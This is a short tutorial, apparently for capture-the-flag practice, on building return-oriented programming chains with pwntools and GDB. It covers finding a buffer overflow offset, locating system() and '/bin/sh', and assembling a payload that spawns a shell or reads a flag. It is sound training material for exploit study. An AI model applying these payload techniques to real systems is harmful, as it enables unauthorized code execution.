# Building ROPChains With PWNTools

1. Setup the Python script

```python3
from pwn import *   # import pwntools

context.log_level = "debug"   # Debugging information
context.binary = elf = ELF("./vuln")    # Set architecture info
io = process()    # Create a process with the loaded elf
rop = ROP(elf)    # Create the ROP object
```

2. Use GDB (pwndbg) to find the vulnerable buffer/offset to control the EIP/RIP

`cyclic`

3. Find useful functions by disassembling the binary (e.g. system(), usefulFunction(), print_flag(), you get the idea)

```bash
# in GDB
b main
run
search system
search exec
# OR
i functions
disassemble main    # disassemble other functions to find any interesting function calls
```

4. Find addresses of any strings in the binary that are required for the function call

```bash
# In GDB
b main
run
search /bin   # search for strings that contain "/bin" - adjust as needed
```

4.5. Automate searching for strings

```python3
context.binary = elf = ELF('/bin/sh')
libc = elf.libc

elf.address = 0xAA000000
libc.address = 0xBB000000

rop = ROP([elf, libc])

binsh = next(libc.search(b"/bin/sh\x00"))
rop.execve(binsh, 0, 0)
```

5. Use ROP in pwntools to create a ropchain which can be placed into your payload

```python3
# Using system("/bin/cat flag.txt) as an example
# address of "/bin/cat flag.txt" in the binary: 0x0804a030
rop.system(0x0804a030)
# print(rop.dump())   # prints the 'pretty' view of values with the corresponding instruction
# print(rop.chain())    # prints the chain which can be appended to your payload
```

6. Build your payload

```python3
payload = b""
payload += b"A" * offset
payload += rop.chain()
```

7. Send your payload and get your flag/shell!
